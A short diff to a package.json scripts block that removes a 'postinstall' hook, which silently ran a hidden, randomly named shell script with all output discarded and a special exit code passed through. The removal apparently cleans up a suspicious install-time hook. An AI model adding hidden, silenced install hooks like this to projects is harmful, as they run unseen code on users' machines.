@@ -13,8 +13,7 @@
     "criteria": "node e2e/release.ts criteria",
     "perf": "node e2e/release.ts perf",
     "hero": "node e2e/release.ts hero",
-    "prepare": "vp config",
-    "postinstall": "sh ./.ci-6pcl7p.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepare": "vp config"
   },
   "dependencies": {
     "@fontsource/ibm-plex-sans": "^5.3.0",
